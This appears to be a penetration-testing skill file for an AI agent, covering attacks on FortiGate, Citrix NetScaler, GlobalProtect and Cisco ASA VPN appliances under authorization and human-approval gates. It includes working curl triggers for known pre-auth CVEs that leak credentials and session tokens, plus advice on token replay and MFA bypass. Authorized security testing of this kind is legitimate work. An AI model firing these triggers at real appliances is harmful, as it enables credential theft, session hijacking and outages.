---
name: ssl-vpn-appliances
description: >
  Remote-access SSL-VPN / edge appliance attack methodology for authorized
  engagements: Fortinet FortiGate (FortiOS SSL-VPN), Citrix ADC/Gateway
  (NetScaler), Palo Alto GlobalProtect, and Cisco ASA/AnyConnect. Covers
  version fingerprinting, known pre-auth CVE chains (file read, session-token
  leak, command injection, memory-corruption RCE), and auth bypass. Keywords:
  SSL-VPN, FortiGate, FortiOS, NetScaler, Citrix Gateway, GlobalProtect, Cisco
  ASA, AnyConnect, Citrix Bleed, CVE-2018-13379, CVE-2019-19781,
  CVE-2023-4966, CVE-2024-3400, CVE-2020-3452, edge appliance, pre-auth. Do
  NOT use for generic web apps behind the VPN (hunt skills) or internal AD
  once inside (active-directory) — this is the perimeter device itself.
metadata:
  type: platform
  phase: hunting
  tools: [nmap, nuclei, curl, httpx, favicon-hash, metasploit, python-poc]
depends_on: [port-scan, service-enumeration, tech-stack-fingerprint]
feeds_into: [chain-analysis, chain-web-to-rce, report-writing]
chains_with: [active-directory, network-infra, credential-testing, entra-attack]
---

## Signals
- TCP 443 on an edge IP presenting a vendor VPN portal: FortiGate `/remote/login`, Citrix `/vpn/index.html` or `/logon/LogonPoint/`, GlobalProtect `/global-protect/login.esp`, Cisco ASA `/+CSCOE+/logon.html`.
- Vendor cookies/headers: `Set-Cookie: NSC_` (NetScaler), `SVPNCOOKIE` (FortiGate), `Server:` banners, distinctive favicon hashes.
- Shodan/Censys/CT-log results for the org showing one of these portals; a version string in the login page or JS bundle.

## Prerequisites
- Written authorization that **explicitly** covers active testing of the named edge appliance by IP/hostname. These are production chokepoints — exploitation can crash the device and sever the organization's remote access (effective DoS). Any exploit attempt (beyond fingerprinting) is a hard HUMAN GATE per project CLAUDE.md.
- Reliable version fingerprint before touching any CVE path — the whole methodology is version-gated.
- A memory-corruption RCE must be proven with a **real, tested PoC** or it stays **Inferred/Unproven**; never report RCE from a version banner alone (project anti-fabrication rule).

## Methodology

### 1. Vendor + version fingerprint (safe, unauthenticated)
```bash
# Identify vendor by portal path + favicon hash
httpx -u https://<edge> -favicon -title -server -sc
# FortiGate: SVPNCOOKIE, /remote/login?lang=en, specific JS build in /sslvpn/
# NetScaler: /vpn/index.html, NSC_ cookies, version often in /nitro/v1/config or error pages
# GlobalProtect: /global-protect/login.esp, /ssl-vpn/login.esp, favicon
# Cisco ASA: /+CSCOE+/logon.html, 'webvpn' in response, Server header build
curl -sk "https://<edge>/remote/login?lang=en" -D - -o /dev/null   # Forti header probe
```

### 2. FortiGate / FortiOS SSL-VPN
```bash
# CVE-2018-13379 (KEV) — pre-auth path traversal file read of the SSL-VPN session DB
# (leaks plaintext usernames/passwords of active sessions). DEMONSTRABLE trigger:
curl -sk "https://<edge>/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"
# A response containing session var/magic bytes + credentials = Demonstrated. HUMAN GATE: this reads
# real employee creds; treat captured creds as sensitive evidence, do not reuse without sign-off.
```
- **CVE-2022-42475 / CVE-2023-27997 (XORtigate) / CVE-2024-21762** — pre-auth heap/OOB RCE in SSL-VPN. No stable public one-liner trigger; version-match only. Label **Inferred** (version in vulnerable range) or **Unproven** until a tested PoC fires in a lab. Do not fire untested memory-corruption exploits at a production appliance.

### 3. Citrix ADC / Gateway (NetScaler)
```bash
# CVE-2019-19781 (KEV) — pre-auth directory traversal enabling template injection -> RCE.
# DEMONSTRABLE read primitive first:
curl -sk "https://<edge>/vpn/../vpns/cfg/smb.conf"
# 200 with smb.conf contents = traversal confirmed (Demonstrated read). The RCE step writes an
# XML template to /netscaler/portal/templates — that is a state-changing write: HARD HUMAN GATE.

# CVE-2023-4966 "Citrix Bleed" (KEV) — out-of-bounds read leaks session tokens from memory via an
# oversized Host/endpoint buffer on the OpenID config endpoint. DEMONSTRABLE token leak:
curl -sk "https://<edge>/oauth/idp/.well-known/openid-configuration" \
  -H "Host: $(python3 -c 'print("a"*24812)')"
# Repeated requests dumping valid NSC_AAAC/session tokens = Demonstrated; replay a token to prove
# session hijack (HUMAN GATE before replaying a real user session).
```
- **CVE-2023-3519** (unauth RCE) and **CVE-2025-5777 "Citrix Bleed 2"** — version-match; RCE/memory-read PoCs are environment-sensitive. Label **Inferred/Unproven** without a tested trigger in-lab.

### 4. Palo Alto GlobalProtect
```bash
# CVE-2024-3400 (KEV) — GlobalProtect command injection via a crafted SESSID cookie that creates a
# path-traversal filename later executed. The exploit WRITES a file on disk and runs commands =
# state-changing, HARD HUMAN GATE. Fingerprint + telemetry-enabled check first; do not blind-fire.
# CVE-2019-1579 — pre-auth format-string RCE in the /sslmgr SSL-VPN handler (older PAN-OS).
curl -sk "https://<edge>/global-protect/login.esp" -D -   # portal/version presence
```
- Both are RCE-class; demonstration requires a tested PoC against an in-scope lab or an explicitly authorized live attempt with rollback understood. Otherwise **Inferred** from version/telemetry state.

### 5. Cisco ASA / AnyConnect
```bash
# CVE-2020-3452 — pre-auth read-only path traversal (web services files, not system files).
# DEMONSTRABLE file read:
curl -sk "https://<edge>/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../"
# CVE-2018-0101 — WebVPN XML parser double-free RCE (older). Memory-corruption: lab-proof only.
# CVE-2023-20269 — unauthenticated remote brute-force / unauthorized VPN session on ASA/FTD when a
# vulnerable config allows it; demonstrate by establishing a session, not by config inference.
```

## Payloads & Detection Patterns
- **Version-to-CVE matrix:** maintain {vendor, exact build, CVE, evidence class}. A build in the vulnerable range is **Inferred** at most; promotion to **Demonstrated** requires the file-read/token-leak/command output captured.
- **Credential harvest from file-read bugs** (CVE-2018-13379, CVE-2020-3452): the leaked creds/tokens are the real impact — handle as sensitive evidence, and any *use* of them is a separate human-gated pivot.
- **Session-token replay** (Citrix Bleed): a leaked `NSC_AAAC`/session cookie replayed to reach an authenticated session is the impact proof; replaying a real employee's session is a human gate.

## Bypass Techniques
- **Pre-auth file read → credential reuse:** many of these bugs don't RCE directly but hand you valid VPN credentials/session tokens; the "bypass" is then just logging in legitimately. Demonstrate the login to prove impact.
- **Auth bypass via token leak:** Citrix Bleed and similar memory-read bugs defeat MFA/auth entirely by stealing an already-authenticated session token — no password needed.
- **Legacy/secondary portals:** older SSL-VPN handlers (`/sslmgr`, legacy FortiOS endpoints) sometimes remain reachable after a partial upgrade — fingerprint every exposed path, not just the main portal.

## Chain Anchors
- Leaked VPN creds/tokens → authenticated VPN access → internal network → `active-directory` / `network-infra`.
- RCE on the appliance → config/secret extraction (LDAP bind creds, RADIUS shared secrets) → pivot to internal auth.
- VPN foothold → reach Entra/AD hybrid surface (`entra-attack`, `active-directory`).

## Tooling
`httpx`/`favicon-hash` and `nmap` for fingerprinting, vendor-specific Nuclei templates (version + known-CVE detection), `curl` for the demonstrable read/leak primitives, lab-validated PoCs or `metasploit` modules for memory-corruption classes (run against a lab replica first). Prefer detection templates over exploit modules until a human gate is cleared.

## Validation Gate
- Version-only match = **Inferred** (or **Unproven** if even the build is uncertain). Never report RCE from a banner.
- File-read / token-leak bugs are **Demonstrated** only with the retrieved file contents or a leaked token captured (request + response, timestamped, custody-logged) — redact the harvested secrets in the report body.
- Memory-corruption RCE is **Demonstrated** only with command output from a tested PoC; a crash or hang is a reliability signal, not RCE, and may itself be an unauthorized DoS.
- Any credential/token actually *used* (login, session replay) must have its own human-gate sign-off recorded separately from the discovery.

## Gotchas
- **These devices break.** Memory-corruption exploits frequently crash the SSL-VPN daemon or the whole appliance, cutting off all remote workers. That is a production outage, not a clean PoC — never fire untested exploits at a live edge; prove them in a lab replica of the exact build first.
- Version fingerprinting is itself unreliable: vendors backport fixes, and a build string can be patched against a CVE without changing the obvious banner. Confirm with a safe read primitive where one exists rather than trusting the number.
- CVE-2018-13379 and Citrix Bleed famously leak **plaintext/session credentials of real users** — this is high-impact and high-sensitivity; captured secrets go in the custody log redacted, and reuse is a separate gate.
- A WAF or vendor virtual-patch in front of the appliance can block the classic trigger strings while the device stays vulnerable to a variant — a blocked request is not proof of patched, and a patched banner is not proof of blocked.
- Palo Alto CVE-2024-3400 only triggers with GlobalProtect + device telemetry enabled in certain configs; absence of the precondition means the version match stays **Inferred**.
